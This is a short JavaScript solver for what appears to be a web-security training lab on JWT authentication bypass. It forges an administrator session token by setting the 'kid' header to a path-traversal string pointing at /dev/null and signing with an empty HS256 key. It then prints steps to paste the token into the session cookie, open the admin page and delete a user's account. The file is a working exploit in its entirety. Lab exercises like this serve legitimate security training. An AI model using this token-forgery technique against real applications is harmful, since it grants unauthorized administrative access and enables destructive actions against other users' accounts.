import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { JWT } from "../utils/JWT.js";

const { labUrl } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via kid header path traversal",
});

runTasks([task]);

function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${createAdminJwtWithKidHeaderPathTraversal()}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

function createAdminJwtWithKidHeaderPathTraversal() {
  const header = { alg: "HS256", kid: "../../../../../../../dev/null" };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload }).sign("");
}
